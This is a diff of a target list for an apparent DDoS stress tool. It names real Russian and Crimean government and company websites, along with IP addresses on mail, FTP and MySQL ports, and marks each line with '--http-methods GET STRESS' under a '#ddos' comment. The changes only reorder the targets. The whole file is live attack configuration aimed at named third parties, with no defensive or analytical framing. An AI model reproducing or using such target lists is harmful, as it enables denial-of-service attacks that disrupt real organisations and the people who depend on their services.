@@ -10,9 +10,9 @@ http://89.208.82.196 tcp://89.208.82.195:22 tcp://89.208.82.195:25 tcp://89.208.
 http://www.gravitel.ru https://www.gravitel.ru http://aloha.ru --http-methods GET STRESS
 
 #ddos separiv
-https://new.sipaero.ru https://mail.new.sipaero.ru tcp://141.8.193.140:21 --http-methods GET STRESS
-https://rk.gov.ru/ru/structure/235 http://crimea.gov.ru tcp://141.8.193.140:25 --http-methods GET STRESS
-https://gisogd.rk.gov.ru http://www.ppcrimea.ru https://minfin.rk.gov.ru/ru/index tcp://94.126.25.146:25 --http-methods GET STRESS
-http://95.173.128.111:80 https://78.155.197.134:443 tcp://212.110.158.43:80 --http-methods GET STRESS
-http://78.155.197.134:9100 http://212.110.158.43:80 tcp://91.224.168.63:80 --http-methods GET STRESS
-http://91.224.168.63:8880 https://md-crimea.ru tcp://91.224.168.63:3306 --http-methods GET STRESS
+https://new.sipaero.ru https://mail.new.sipaero.ru https://md-crimea.ru --http-methods GET STRESS
+http://www.ppcrimea.ru https://rk.gov.ru/ru/structure/235 http://crimea.gov.ru --http-methods GET STRESS
+https://gisogd.rk.gov.ru http://minfin.rk.gov.ru/ru/index http://95.173.128.111:80 --http-methods GET STRESS
+https://78.155.197.134:443 http://78.155.197.134:9100 http://212.110.158.43:80 --http-methods GET STRESS
+http://91.224.168.63:8880 tcp://141.8.193.140:21 tcp://141.8.193.140:25 tcp://94.126.25.146:25 --http-methods GET STRESS
+tcp://212.110.158.43:80 tcp://91.224.168.63:80 tcp://91.224.168.63:3306 
